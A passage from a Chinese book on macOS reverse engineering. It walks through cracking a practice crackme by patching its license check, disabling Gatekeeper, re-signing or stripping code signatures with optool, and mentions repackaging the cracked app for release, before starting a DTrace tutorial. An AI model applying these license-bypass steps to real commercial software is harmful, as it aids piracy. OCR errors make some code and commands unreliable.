        _TTSf4s_s_d_d__TFs18_fatalErrorMessageFTVs12StaticStringS_S_Su_T_("fatal error", 0xb, rdx, rcx, 0x39, 0x2);
    }
    [var_60 retain];
}

##### 图6-23 Pseudo Code伪代码窗口

IDAView-A ☐Pseudocode-A ☐Strings window ☐Hex View-1 ☐Structures ☐Enums ☐Imports ☐

328 LODWORD(v26) = (*(int:(_fastcall **)(_WORD *))((*(_WORD *)swift_isallask_ptr & *a2) + 0x68LL))(a2);
329 v257 = v26;
330 if (!v26)
331 _TTSF4s_s_d_d_TFs18_fatalErrorMessageFTUs12StaticStrings_S_Su_T_
332 "fatal error",
333 11LL,
334 2LL,
335 "unexpectedly Found nil while unwrapping an Optional value",
336 57LL,
337 2LL);
338 objc_retain(v257);
339 v27 = objc_msgSend(v257, selRef_stringValue);
340 LODWORD(v28) = objc_retainAutoreleasedReturnValue(v27);
341 LODWORD(v29) = _TF10Foundation24_convertNSSStringToStringFGSqCSo8NSSString_SS(v28);
342 v254 = v29;
343 v255 = v30;
344 v256 = v31;
345 v216 = v29;
346 v215 = v30;
347 v214 = v31;
348 objc_release(v257);
349 objc_release(v257);
350 if ( _TFSg7isEmptySb(v216, v215, v214) & 1 )
351 {
352 LODWORD(v32) = (*(int(_fastcall **)(_WORD *))((*(_WORD *)swift_isallask_ptr & *a2) + 0x68LL))(a2);
353 v222 = v32;
354 if (!v32)
355 _TTSF4s_s_d_d_TFs18_fatalErrorMessageFTUs12StaticStrings_S_Su_T_
356 "fatal error",
357 11LL,
358 2LL,
359 "unexpectedly Found nil while unwrapping an Optional value",
360 57LL,
361 2LL);
362 nhic_retain(v222);

 </div>

从这两个工具给出的伪代码来看，阅读性似乎并没有那么强，尤其是长串的方法名，如_TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS。这一长串符号是经过Swift编译器进行名称改编后的名字，目前Hopper与IDA Pro在这些名字的改编显示方面还比较弱。要想

知道这些改编过的名称原来的符号信息,可以借助Swift编译器的工具包中提供的一个命令行工具 swift-demangle。在终端执行如下命令查看以上名称的原名称:

$ xcrun swift-demangle _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS
_TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS ---> Swift.String.init
(_builtinStringLiteral : Builtin.RawPointer, byteSize : Builtin.Word, isASCII : Builtin.Int1) -> Swift.String

从输出的结果可以看出，原方法名为Swift.String.init()，是字符串的一个构造方法，接收3个参数，第一个参数是字符串常量，第二个参数是字符串长度，第3个参数表示是否为ASCII码。

反汇编界面上所有的swift符号，都可以使用该方法来还原它的名称。swift-demangle是Swift编译器工具集的一部分，也是开源的。有兴趣的朋友可以参考它的实现代码，为反汇编工具编写脚本或插件，让它们能更好地显示Swift中的符号。当然，如果你比较懒惰不想自己动手，可以到网上下载使用别人编写好的，比如hopper-swift-demangle $ ^{①} $。

注意，Hopper从v4版本开始，加强了Swift的符号解析，对符号的展示效果已经能做到与swift-үүдle一样的输出了。

### 6.5 破解 Mach-O 程序

经过一段时间的分析，我们应该对程序的功能与验证大致有了一定的了解，下一步操作就是修改程序来验证分析是否正确。

#### 6.5.1 定位修改点

在反汇编一节中，我们已经知道了，00000001000037e7行的指令test al, 0x1就是crackme的爆破点所在，如图6-25所示。

 </div>

test al, 0x1对应的机器码是 “A8 01”，需要修改为mov al, 0x1，执行如下命令获取机器码：

对应的机器码为 “B0 01”，因此，只需要将00000001000037e7行的 “A8 01” 改成 “B0 01” 即可。

#### 6.5.2 修改程序

使用任意一款十六进制编辑器（比如UltraEdit $ ^{①} $）打开文件，发现文件中根本没有该地址，文件大小显示只有0x14b00字节，如图6-26所示。

 </div>

其实，00000001000037e7不是文件的物理地址，而是代码加载到内存中的虚拟地址。当程序加载到内存中时，映射的初始代码虚拟地址（也称为代码加载基地址）是通过程序在加载命令segment_command/segment_command_64中指定的。回忆一下segment_command_64结构体的定义：

struct segment_command_64 {
    uint32_t cmd;
    uint32_t cmdsize;
    char segname[16];
    uint64_t vmaddr;
    uint64_t vmsize;
    uint64_t fileoff;
    uint64_t filesize;
    vm_prot_t maxprot;
    vm_prot_t initprot;
    uint32_t nsects;
    uint32_t flags;
};

vmaddr与vmsize指定的就是段加载到内存中的地址与内容的大小, fileoff字段是段数据在文件中的起始地址, 虚拟地址到文件地址的转换计算的方法如下:

fileaddr（代码真实物理地址）= codevmaddr（代码虚拟地址）- vmaddr（段所在虚拟地址）+ fileoff（文件偏移）

codevmaddr的值是00000001000037e7，vmaddr可以使用otool工具查看，如下所示：

$ otool -l ~/Desktop/crackme
/Users/android/Desktop/crackme:
Load command 0
cmd LC_SEGMENT_64
cmdsize 72
segname PAGEZERO
vmaddr 0x000000000000000
vmsize 0x0000000100000000
fileoff 0
filesize 0
maxprot 0x00000000
initprot 0x00000000
nsects 0
flags 0x0
Load command 1
cmd LC_SEGMENT_64
cmdsize 632
segname TEXT
vmaddr 0x0000000100000000
vmsize 0x000000000000000
fileoff 0
filesize 32768
maxprot 0x000000007
initprot 0x000000005
nsects 7
flags 0x0

可以看出，___TEXT段的加载地址是0x0000000100000000，fileoff是0，因此计算可以得到：

fileaddr = 00000001000037e7 - 0x000000010000000 + 0 = 0x37e7

最后，在UltraEdit中，按下键盘上的command+L，并输入0x37e7，定位到修改点后，将“A801”改成“B001”即可。

以上介绍的是手动修改程序的方法，在IDA Pro中修改程序的话，可以将鼠标放到要修改的代码上，点击IDA Pro菜单Edit→Patch Pragma→Assemble，如图6-27所示。

 </div>

点击OK修改完成后，再点击菜单Edit→Patch Pragma→Apply patches to input file，弹出修改保存对话框，再次点击OK就保存成功了，如图6-28所示。

 </div>

在Hopper中修改也很简单，定位到要修改的代码行00000001000037e7，点击菜单Modify→Assemble Instruction，在弹出的对话框中输入汇编指令mov al, 0x1，然后点击Assemble and Go Next，如图6-29所示。修改完成后，点击菜单File→Produce New Executable保存即可。

 </div>

#### 6.5.3 代码签名处理

在开启了GateKeeper的系统上，直接运行修改后的程序会错误退出。这是因为程序经过修改后，原来的签名信息验证失败了。因此，需要对程序进行重新签名才能正常运行。重新签名软件需要用到签名证书，而且必须是经过苹果公司颁发认证的，如果证书是自签名的或是其他机构颁发的，GateKeeper同样会阻止签名后的软件运行。

如果只是想在电脑上运行破解后的软件，可以选择手动关闭GateKeeper，但这样做之前需要明确，这可能会给计算机带来一定的风险。

关闭 GateKeeper 的方法是：依次点击 Dock 上的 System Preferences → Security & Privacy → General，将 “Allow apps download from:” 设置为 “Anywhere”。GateKeeper 关闭完成后，自签名或者没有签名的程序都是可以正常运行的。

创建自签名证书比较简单。首先打开Keychain Access，点击菜单Keychain Access→Certificate Assistant→Create a Certificate，在弹出的证书助理对话框中，输入证书名，例如“mycert”；在Identify Type中选择Self Signed Root，表示要使用的是自签名的根证书；在Certificate Type中选择Code Signing，表示证书应用于代码签名；然后勾选Let me override defaults，如图6-30所示。

 </div>

然后点击Continue，根据提示输入证书的有效日期、证书创建人详细信息，不停点击Continue直到完成，如图6-31所示。

 </div>

创建完成后，就可以使用mycert证书对程序进行签名了，在终端执行如下命令：

$ codesign -f -s mycert ~/Documents/crackme.app/Contents/MacOS/crackme

/Users/android/Documents/crackme.app/Contents/MacOS/crackme: replacing existing signature

执行以上命令的时候，系统会弹出提示框，询问是否允许使用mycert证书进行代码签名，点击选择Allow即可。

如果你觉得创建自签名证书比较麻烦，可以直接使用Adhoc签名，执行以下命令即可：

$ codesign -s '- ' ~/Documents/crackme.app/Contents/MacOS/crackme

签名成功后的程序，使用codesign查看它的证书信息，如下所示：

$ codesign -d -vv ~/Documents/crackme.app/Contents/MacOS/crackme
Executable=/Users/android/Documents/crackme.app/Contents/MacOS/crackme
Identifier=fc.crackme
Format=app bundle with Mach-0 thin (x86_64)
CodeDirectory v=20100 size=763 flags=0x0(none) hashes=19+3 location=embedded
Signature size=1887
Authority=mycert
Signed Time=May 23, 2016, 21:17:31
Info.plist entries=23
TeamIdentifier=not set
Sealed Resources version=2 rules=12 files=13
Internal requirements count=1 size=88

另外一种处理签名的方法是直接去除程序的签名（strip signature）。去除签名的原理在前面已经讨论过，就是将程序中的签名加载命令删除，然后修正程序中的相关数据字段。codesign提供了remove-signature参数来移除程序中的签名，但它只能移除使用本机证书签名的程序，在使用上有诸多不便。

推荐使用第三方工具来完成代码签名移除工作。首先是Hopper，对于有代码签名的程序，在执行菜单命令Produce New Executable时，会弹出一个对话框询问是否去除代码签名，如图6-32所示。

 </div>

点击Yes按钮后，Hopper会生成一个没有签名的程序。

其次，还可以使用optool $ ^{①} $来对程序进行代码签名去除，可以执行如下命令：

$ optool strip -t ~/Documents/crackme.app/Contents/MacOS/crackme -o ~/Desktop/crackme_stripped
Found thin header...
stripping code signature for architecture x86_64...
Successfully stripped code signatures
Writing executable to /Users/macbook/Desktop/crackme_stripped...

再次使用codesign查看它的签名，会提示没有签名信息，使用optool -l命令也看不到LC_CODE_SIGNATURE的输出，如下所示：

$ codesign -d -vv ~/Desktop/crackme_stripped
/Users/macbook/Desktop/crackme_stripped: code object is not signed at all

下面我们看看optool去除代码签名的功能是如何实现的，代码如下所示：

000L stripCodeSignatureFromBinary(NS变色Data *binary, struct thin_header macho, BOOL softStrip) {
binary.currentOffset = macho.offset + macho.size;
BOOL success = NO;

for (int i = 0; i < macho.header.ncmds; i++) {
    if (binary.currentOffset >= binary.length || binary.currentOffset > macho.header.sizeofcmds + macho.size + macho.offset)
        break;

    uint32_t cmd = [binary intAtOffset:binary.currentOffset];
    uint32_t size = [binary intAtOffset:binary.currentOffset + sizeof(uint32_t)];

    switch (cmd) {
        case LC_CODE_SIGNATURE: {
            struct linkedit_data_command command = *(struct linkedit_data_command *) (binary.bytes + binary.currentOffset);
            LOG("stripping code signature for architecture %s...", CPU(macho.header.cputype));
            if (!softStrip) {
                macho.header.ncmds -= 1;
                macho.header.sizeofcmds -= sizeof(struct linkedit_data_command);
                [binary replaceBytesInRange:NSMakeRange(command.dataoff, command.datasize) withBytes:0 length:command.datasize];
                [binary replaceBytesInRange:NSMakeRange(binary.currentOffset, sizeof(struct linkedit_data_command)) withBytes:0 length:0];
                [binary replaceBytesInRange:NSMakeRange(macho.offset + macho.header.sizeofcmds + macho.size, 0) withBytes:0 length:size];
                } else {
                [binary replaceBytesInRange:NSMakeRange(binary.currentOffset, 4) withBytes: &OP_SOFT_STRIP];
                }
                success = YES;
                break;
            }
            default:
                binary.currentOffset += size;
                break;
        }
    }
}

if (!softStrip) {
    [binary replaceBytesInRange:NSMakeRange(macho.offset, sizeof(macho.header)) withBytes: &macho.header.length:sizeof(macho.header)];
}

return success;

代码循环遍历程序的加载命令列表寻找LC_CODE_SIGNATURE加载命令，找到后判断是否为软去

除（软去除表示只是修改签名数据的加载命令头信息，不修改清除实际的签名数据），不是的话就修改文件（硬去除），将加载命令的数量减一，然后删除代码签名加载命令`linkedit_data_command`指定的数据偏移与大小，接着删除加载命令自身占用的字节，最后修正Mach-O头部的加载命令数据大小字段。

除了optool，还有一个工具专门用于去除macOS程序的代码签名，它就是`unsigned`，它的工作原理与optool类似，感兴趣的读者可以自行了解，此处就不再展开讨论了。

#### 6.5.4 重新打包

再次运行修改并处理好签名的程序，输入任意的用户名和“xxxx-xxxx-xxxx-xxxx”格式的序列号，都会注册成功，如图6-33所示，这说明程序破解成功了！

 </div>

破解完成后，可以使用前面介绍的方式，将程序打包成pkg安装包或者dmg镜像发布。

#### 6.5.5 Keygen

Keygen即算法注册机，它是软件分析人员对于程序算法逆向成功展示的最高境界。本章的crackme算法在前面分析时调用了AppDelegate类偏移为0xf8的方法，但通过静态分析，仍然无法得知其真实方法名。在本例中，AppDelegate类的方法并不多，可以查看它的方法列表，通过方法名来判断它是否为注册算法。当然，这种方式并不完美，更加优雅的方式是下一章将要介绍的动态调试，通过动态调试来查找程序的注册算法要简单得多。

通过查看方法名，可以知道注册算法为- $ [_TtC7crackme11AppDelegate checkSN:sn:] $：，使用IDA Pro还原它的伪代码，如下所示：

int64 _fastcall_TToFC7crackme11AppDelegate7checkSNfTSS2snSS_Sb(__int64 a1, __int64 a2, __int64 a3, int64 a4)
{
    LODWORD(v6) = _TF10Foundation24_convertNSSStringToStringFGSqCSo8NSSString_SS(v5);
    //Foundation._convertNSSStringToString(__ObjC.NSSString?) -> Swift.String
    v7 = v6;
    v9 = v8;
    v11 = v10;
    LODWORD(v12) = _TF10Foundation24_convertNSSStringToStringFGSqCSo8NSSString_SS(v4);
    //Foundation._convertNSSStringToString(__ObjC.NSSString?) -> Swift.String
    v15 = _TFC7crackme11AppDelegate7checkSNfTSS2snSS_Sb(v7, v9, v11, v12, v13, v14, a1);
    //crackme.AppDelegate.checkSN(Swift.String, sn: Swift.String) -> Swift.Bool
    objc_release(a1);
    return (unsigned int)(char)_TF10ObjectiveC22_convertBoolToObjCBoolFSbVS_8ObjCBool((unsigned __int8)v15); //ObjectiveC._convertBoolToObjCBool(Swift.Bool) -> ObjectiveC.ObjCBool
}
其实调用的是_TFC7crackme11AppDelegate7checkSNfTSS2snSS_Sb，也就是crackme.AppDelegate_eckSN()，它的完整算法含义不难理解，就当留给读者的作业吧。
最后，输入计算正确的注册码会弹出正确的提示，如图6-34所示

最后，输入计算正确的注册码会弹出正确的提示，如图6-34所示。

 </div>

### 6.6 本章小结

本章主要讨论了软件二进制静态分析的基本方法、逆向分析工具的使用以及软件的破解方法。软件静态分析与动态调试是逆向分析工程中主要的两种分析手段，通过本章的学习，读者要掌握静态分析的方法以及反汇编工具的使用。这些反汇编工具集成的软件调试功能将在下一章中介绍。

# 软件动态调试与跟踪

本章主要讲解软件逆向分析中经常使用的动态调试与跟踪技术, 它们在实际逆向工程过程中的使用场景比静态分析更多。

### 7.1 DTrace

软件跟踪技术是一种宏观的软件动态分析技术。通过观察软件运行时的函数调用，初步判断软件的工作流程与原理。现代的软件跟踪工具甚至能在跟踪过程中修改软件执行流程，细粒度地观察软件的某一部分行为，本节将要介绍的DTrace就是这样一款强大的软件跟踪工具。

#### 7.1.1 DTrace 简介

DTrace是由SUN公司为Solaris操作系统开发的一款动态跟踪工具。该工具功能十分强大，后来被移植到了macOS、BSD以及Linux等操作系统上，主要用于性能分析和故障排除等工作。

DTrace与Linux系统上常用的strace十分类似，在功能上包含了Windows系统上的Process Monitor和API Monitor等工具的功能，在逆向工程中主要用于跟踪目标程序，分析函数调用，了解目标程序的行为。

如果读者有strace等工具的使用经验，那么学习使用DTrace会轻松许多。即使没有也不必担心，本章将会从简单的示例开始，逐步演示DTrace的基本用法。

不过，由于DTrace功能十分复杂，过于深入的讲解将会大大超出本书的探讨范围。想要深入了解DTrace的读者可以登录http://dtrace.org/网站，该网站上有大量关于DTrace的资料，其中“Dynamic Tracing Guide”手册是深入学习DTrace不可多得的好资料。

#### 7.1.2 DTrace 示例

首先看一个简单的DTrace的示例。打开一个终端，输入如下命令并回车：

$ sudo dtrace -n 'proc::posix_spawn:exec-success { printf("execname: %s", execname); }'

输入sudo密码，如果没有错误发生的话，DTrace将会输出一条提示：
dtrace: description 'proc::posix_spawn:exec-success ' matched 1 probe
点开Launchpad，打开计算器程序，将会看到DTrace产生了如下输出：
CPU ID FUNCTION:NAME
0 1235 posix_spawn:exec-success execname: Calculator

再任意打开几个应用，也会产生类似的输出，只是execname后面的名字会有变化。看到这里，相信聪明的读者一定就明白了，这条DTrace命令的作用就是跟踪新打开的应用，并输出打开应用的名字。

本章接下来将围绕这条命令详细讲解如何使用DTrace进行跟踪。

### 7.2 D 脚本语言

在上一节的示例中，我们使用DTrace执行了一段脚本，这段脚本告诉了DTrace我们关心程序的哪些行为，以及当这些行为触发时需要进行怎样的操作。这种脚本使用的语言名为D语言，不过这个D语言可不是通用编程语言的那个D语言，这是一门专门由DTrace使用的跟踪语言。

#### 7.2.1 脚本加载方式

在开始讲解D语言语法之前，我们先来了解一下D脚本的加载方式，从而方便之后的测试。D脚本一共有以下3种（严格来讲是两种）加载方式。

☐ DTrace直接执行。在前面的示例中，是直接在命令行中写出了脚本的内容，并通过-n参数传递给DTrace来执行。这种方式适合内容简短的脚本，使用起来很方便。

DTrace调用脚本文件执行。可以将脚本写入文件中，然后通过dtrace -s <script path>的方式加载到DTrace中执行。如果脚本比较复杂，不方便在命令行中编写，可以使用这种方法。

作为脚本文件直接执行。这种方式其实本质上与第二种是相同的，也是将脚本的内容写入一个文本文件中执行。区别在于这种方法为脚本文件添加了shebang头与可执行权限，之后通过直接运行的方式来执行脚本，这种方法便于将常用功能制作成命令行工具。

下面演示一下如何将上述示例改为使用第三种加载方式。首先使用任意一款熟悉的文本编辑器将上面的脚本代码保存到一个名为“trace-newapp”的文件中，并整理格式如下：

proc::posix_spawn:exec-success
{
    printf("execname: %s", execname);
}
然后在起始部分添加shebang头，编写过shell脚本的读者应该对此很熟悉：

##!/usr/sbin/dtrace -s

proc::posix_spawn:exec-success
{
    printf("execname: %s", execname);
}

shebang头的意义其实就是当直接执行该脚本的时候，系统会自动根据#!后面指定的参数加载这个脚本。

编写完并保存后，打开一个shell切换到脚本所在的目录，执行如下命令为脚本添加可执行权限：

$ chmod +x trace-newapp

以后要使用该脚本时就可以直接执行如下命令：

$ sudo ./trace-newapp

本章后面的示例代码将全部使用第三种方式加载，大家在实际使用中可根据情况自行选择。

#### 7.2.2 D 语言与 C 语言

在语法上，D语言是ANSIC语言的一个超集，但并不是所有的C语法都可以在D语言中使用。D脚本是由DTrace编译后在系统内核中执行的，也正因为如此，D脚本有着如下一些限制。

☐ 不支持循环，程序中无法使用for、while等循环，这个限制是为了防止在内核中的循环消耗大量时间，甚至死循环导致整个系统卡死。

☐ 不支持if判断语句，可以使用D语言提供的谓词扩展替代，详细介绍见后文。

☐ 不支持C语言的函数定义，只能使用内置的函数。可能是由于函数递归也可以实现循环操作并且有栈溢出的风险。

□ 不支持C的宏定义，但是可以使用杂注（#pragma）控制脚本的某些行为，日常使用中很少用到。

☐ 变量的定义与标准C不同，详细介绍见后文。

☐ 无法进行危险的指针操作，比如有的指针不支持赋值操作。

其他的C语言语法如定义结构体、强制类型装换和其他C的运算符等，基本上都可以在D语言中使用。

#### 7.2.3 D 语言语法

了解了D语言相对于C语言有哪些限制，接下来看看D语言新增了哪些语法。

在C语言里，C的源代码主要由类型声明、全局变量和函数组成。由于D语言没有函数且一般比较简单，所以D语言的代码主要是由一个或多个探测器子句组成，在探测器子句外面的只可以

有类型定义或声明语句，不可以有定义变量或执行操作的语句。

一个探测器子句由探测器说明、谓词和操作语句列表3部分组成，其中谓词和操作语句列表可以省略。

对应到前面的trace-newapp脚本，proc::posix_spawn:exec-success属于探测器说明，用于描述希望跟踪的探测器；printf("execname:%s", execname);属于操作语句，用于说明当探测器触发时要做的事情；这个示例中没有使用谓词，谓词是一组过滤条件，符合该条件才会执行下面的操作语句。

# 1. 探测器说明语句

探测器是DTrace内核模块提供的一些监控系统的接入点, 当系统中的程序执行特定的操作时就会触发某些探测器, DTrace就会执行这些探测器上注册的操作。

一个探测器说明语句可以分为提供器、模块、函数和名称4个部分，各个部分之间用冒号分隔开。DTrace会将事件与探测器说明进行模式匹配，匹配成功则会执行后面的操作语句。

要查看DTrace提供的探测器可以执行sudo dtrace -l命令列出所有的探测器，不过探测器的数量一般比较多，可以配合grep等命令进行查找。DTrace打印的探测器列表格式如下：

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>ID</td><td style='text-align: center; word-wrap: break-word;'>PROVIDER</td><td style='text-align: center; word-wrap: break-word;'>MODULE</td><td style='text-align: center; word-wrap: break-word;'>FUNCTION NAME</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1</td><td style='text-align: center; word-wrap: break-word;'>dtrace</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>BEGIN</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2</td><td style='text-align: center; word-wrap: break-word;'>dtrace</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>END</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3</td><td style='text-align: center; word-wrap: break-word;'>dtrace</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>ERROR</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>lockstat</td><td style='text-align: center; word-wrap: break-word;'>mach_kernel</td><td style='text-align: center; word-wrap: break-word;'>lck_mtx_lock_adaptive-acquire</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>5</td><td style='text-align: center; word-wrap: break-word;'>lockstat</td><td style='text-align: center; word-wrap: break-word;'>mach_kernel</td><td style='text-align: center; word-wrap: break-word;'>lck_mtx_lock_adaptive-spin</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>6</td><td style='text-align: center; word-wrap: break-word;'>lockstat</td><td style='text-align: center; word-wrap: break-word;'>mach_kernel</td><td style='text-align: center; word-wrap: break-word;'>lck_mtx_lock_adaptive-block</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>7</td><td style='text-align: center; word-wrap: break-word;'>lockstat</td><td style='text-align: center; word-wrap: break-word;'>mach_kernel</td><td style='text-align: center; word-wrap: break-word;'>lck_mtx_try_lock_adaptive-acquire</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8</td><td style='text-align: center; word-wrap: break-word;'>lockstat</td><td style='text-align: center; word-wrap: break-word;'>mach_kernel</td><td style='text-align: center; word-wrap: break-word;'>lck_mtx_try_spin_lock_adaptive-acquire</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>9</td><td style='text-align: center; word-wrap: break-word;'>lockstat</td><td style='text-align: center; word-wrap: break-word;'>mach_kernel</td><td style='text-align: center; word-wrap: break-word;'>lck_mtx_unlock_adaptive-release</td></tr></table>

除了ID列，剩下的4列分别对应探测器说明语句的4个部分，没有的部分则可以直接留空。DTrace在进行匹配时会依次匹配这4个部分，如果探测器说明语句中某个部分为空，则表示这个部分可以匹配任意值。

除了留空的位置可以匹配任意值之外，DTrace还支持表7-1中的匹配模式。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>符号</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>*</td><td style='text-align: center; word-wrap: break-word;'>匹配任意字符任意多次，包括零次</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>?</td><td style='text-align: center; word-wrap: break-word;'>匹配任意字符一次</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[x-y]</td><td style='text-align: center; word-wrap: break-word;'>匹配x或y，例如“[g-s]etuid”可以匹配“getuid”或者“setuid”</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[!...]</td><td style='text-align: center; word-wrap: break-word;'>匹配除了方括号里面字符以外的任意字符，例如“get[!pg]id”可以匹配“getuid”、“gettid”和“getsid”，但是不能匹配“getpid”和“getgid”</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>\</td><td style='text-align: center; word-wrap: break-word;'>转义字符，用在特殊字符之前表示取消该字符的特殊含义，与C语言字符串中的转义字符类似</td></tr></table>

# 2. 操作语句

操作语句放在探测器说明语句之后的大括号中，由于D语言的限制，操作语句一般比较简单，甚至可以省略不写。如果不写操作语句，DTrace默认只会打印触发的探测器。

在上面的实例中，使用printf函数将posix_spawn所执行的程序名打印了出来。在绝大多数情况下，操作语句要做的事情就是将触发探测器时传入的变量进行整理并输出。

有时候也可以执行一些统计操作或破坏性的操作，不过这些并不在本书的讨论范围内。

# 3. 谓词

前面提到D语言中没有判断语句，那要如何执行判断操作呢？这时就需要谓词表达式了。谓词位于探测器语句和操作语句之间，以“/”开始和结束。对于之前的示例，如果想要在打开 Calculator 的时候进行记录，在其他时候则忽略，可以使用如下写法：

#!/usr/sbin/dtrace -s
proc::posix_spawn:exec-success
/execname == "Calculator" /
{
    printf("execname: %s", execname);
}

再次运行脚本,会发现只在打开计算器程序的时候有输出,打开其他程序则不会有任何反应。也可以同时定义两个相同的探测器子句,但是谓词部分的条件不同,就可以针对不同的条件执行不同的操作,如下所示:

proc::posix_spawn:exec-success
/execname == "Calculator" /
{
    printf("execname: %s", execname);
}
proc::posix_spawn:exec-success
/execname == "TextEdit" /
{
    printf("execname: %s", execname);
}

执行这段脚本并运行计算器和文本编辑器，输出如下：

CPU ID FUNCTION: NAME
0 1235 posix_spawn:exec-success execname: Calculator
0 1235 posix_spawn:exec-success execname: TextEdit

# 4. BEGIN、END与ERROR探测器

BEGIN、END与ERROR探测器是DTrace自身提供的3个比较特殊的探测器，分别会在启动、退出和发生错误时执行。由于一般没有其他探测器以BEGIN、END和ERROR命名，所以可以直接

接省略提供器、模块和函数部分。

可以写一段脚本来进行测试：

#!/usr/sbin/dtrace -s

BEGIN
{
    printf("In Begin!");
}

END
{
    printf("In END!");
}

执行这段脚本，DTrace会输出一句"In Begin!", 而按下ctrl+C退出DTrace时，则会输出一句END!"。

ERROR探测器只会在D脚本发生运行时错误的时候才触发, 如果脚本中有语法错误并不会触发该探测器, 并且ERROR探测器并不会导致DTrace的退出, 如果要退出需要自己调用exit函数。

可以在trace-newapp的脚本中添加一个读取空指针的操作来触发一个运行时错误：

#!/usr/sbin/dtrace -s

#!/usr/sbin/dtrace -s

proc::posix_spawn:exec-success
{
    printf("execname: %s", execname);
    /* Raise a run-time error */
    *(int*)NULL;
}

ERROR
{
    printf("In ERROR!");
}

执行该脚本并运行某个应用，可以看到DTrace产生了如下输出：

CPU ID FUNCTION:NAME
0 3 :ERROR In ERROR!
dtrace: error on enabled probe ID 1 (ID 1235: proc:mach_kernel:posix_spawn:exec-success): invalid
address (0x0) in action #2 at DIF offset 16

在触发运行时错误之后DTrace并没有自动退出，如果继续打开新的应用，DTrace将会继续产生错误输出。

#### 7.2.4 变量

D语言中变量的定义与C语言变量的定义差别比较大，D语言支持全局变量、子句局部变量和线程局部变量3种变量。

首先看一下如何定义一个全局变量。要定义全局变量非常简单，只要在任意子句中对一个变量赋值即可。

下面这段脚本首先在BEGIN子句中定义了一个名为num的int型变量，然后在每次运行计算器时为变量值加1并打印出该变量：

#!/usr/sbin/dtrace -s

BEGIN
{
    num = 0;
}

proc::posix_spawn:exec-success
/execname == "Calculator" /
{
    ++num;
    printf("num = %d", num);
}

执行该脚本，打开计算器程序并关闭，重复执行多次，可以看到如下输出：

CPU ID FUNCTION: NAME
0 1235 posix_spawn:exec-success num = 1
0 1235 posix_spawn:exec-success num = 2
0 1235 posix_spawn:exec-success num = 3

D语言会自动推导出变量的类型，并不需要像C语言一样在定义时写明类型。

D语言定义子句局部变量的语法比较特殊，需要使用this关键字：

#!/usr/sbin/dtrace -s
BEGIN
{
    /* num变量只能在这个BEGIN子句中使用 */
    this->num = 0;
    printf("num = %d", this->num);
}

线程局部变量与子句局部变量很相似，只需要将this关键字改为self关键字即可。

线程局部变量对于同一个线程中的所有子句都是可见的，不过需要明确的是，D语言本身并没有开启新线程的方法。这里的线程是指的系统中的线程。如果一个程序开了多个线程，都执行了触发某个探测器的操作，则这个探测器子句中的线程局部变量会有多份，分别与每一个线程对应，这里就不详细演示了。

对于变量类型，D语言与C语言有着相同的数据类型，不过D语言有一些扩充，其中最主要的是字符串类型和关联数组。

在D语言中，字符串不再是char数组，而是string类型。string类型比char数组更为强大，可直接用“=”来比较是否相同。这也是之前可以在谓词的判断表达式中直接比较execname与Calculator是否相同的原因。

D语言不支持数组，但是支持关联数组。关联数组是一种复合类型，类似于其他语言中的字典类型。关联数组的定义可以有如下写法：

 $ x[123] = 456; $
 $ y[ "foo" ] = "bar"; $

关联数组的key也可以使用元组（逗号分隔的列表）：

z[123, "foo"] = "456bar";

不过在DTrace脚本中使用元组作为key的情况比较少。

#### 7.2.5 参数传递

有时候可能需要向D脚本中传递一些参数,比如想要将trace-newapp改为只跟踪指定的程序是否被打开,但是并不希望每次都修改脚本来指定进程,这时就可以将其作为参数传入。

在D脚本中，参数通过$1、$2……的方式来获取，修改后的trace-newapp代码如下：

#!/usr/sbin/dtrace -s

proc::posix_spawn:exec-success
/execname == $1/
{
    printf("execname: %s", execname);
}

然后就可以在命令行执行sudo ./trace-newapp ' "Calculator"' 命令来跟踪是否有计算器进程被创建，也可以将“Calculator”改为其他的应用名，来监视其他应用是否被启动。

相信细心的读者会发现命令行中的Calculator外层有两层引号，一层双引号和一层单引号，这是因为$1类型的参数属于宏替换，直接将$1替换为第一个参数的内容，如果不加双引号，判断部分会变成execname == Calculator。

这显然不是我们想要的结果，可以为参数加上双引号——但是还有一个问题，shell会把双引号给“解释”掉。因此，还需要在双引号外面再加一层单引号。

当然这不是唯一的解决方法，如果确定某个参数是字符串，可以用两个“$”来使用它，将$1改为$1，之后执行该脚本时参数就不需要再加两层引号了。

#### 7.2.6 聚合

聚合可以理解为DTrace提供的一组方便分析收集到的数据的特殊函数，这组函数都有着特定的使用格式，此处只介绍其中的count()函数，其他聚合函数一般用作性能分析，有兴趣的读者

可以自行查阅DTrace手册。

count()函数会记录自身调用的次数，并在DTrace退出时输出。下面一段代码可以用来统计各个应用被打开的次数：

#!/usr/sbin/dtrace -s

proc::posix_spawn:exec-success
{
@exec_times[execname] = count();
}

运行后任意打开几个应用，重复几次关闭打开操作，然后按Ctrl+C结束DTrace，就可以看到每个应用打开的次数，如下所示：

AddressBookManag 1
AddressBookSourc 1
Calendar 1
Contacts 1
Notes 1
XPCKeychainSandb 1
com.apple.iCloud 1
com.apple.spotli 1
syncdefaultsd 1
Calculator 2
Reminders 3
com.apple.Addres 3
mdworker 12

